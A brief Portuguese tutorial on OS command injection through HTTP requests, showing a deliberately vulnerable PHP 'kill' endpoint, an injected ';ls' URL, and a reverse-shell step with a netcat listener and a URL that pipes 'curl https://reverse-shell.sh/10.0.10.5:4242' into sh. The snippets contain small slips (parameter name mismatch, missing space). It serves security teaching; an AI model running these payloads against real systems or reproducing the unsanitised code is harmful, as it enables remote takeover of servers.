é uma vulnerabilidade que permite o envio de comandos ao sistema via requisição HTTP.

As linguagens tem comandos para executar comandos no sistema.

```php
<?php
system('id');
?>
```

```python
import os
os.system('id')
```

## Injeção
Caso o sistema não estiver tratando o valor obtido, podemos injetar um comando de nosso uso.

**Requisição normal**
<input style="width:100%;padding:5px;font-size:18pt;" value="http://corp.com/kill?pid=123">
```php
<?php
$pid = $_GET['id'];
system('kill -9' . $pid);
?>
```

**Injeção**
<input style="width:100%;padding:5px;font-size:18pt;" value="http://corp.com/kill?pid=123;ls">
```php
<?php
$pid = $_GET['id'];
system('kill -9' . $pid); # kill -9 123;ls
?>
```

## Reverse shell
Considerando que nosso ip seja 10.0.10.5, podemos baixar uma reverse shell na máquina alvo.

```sh
ncat -lnvp 4242
```
<input style="width:100%;padding:5px;font-size:18pt;" value="http://corp.com/kill?pid=123;curl https://reverse-shell.sh/10.0.10.5:4242 | sh">
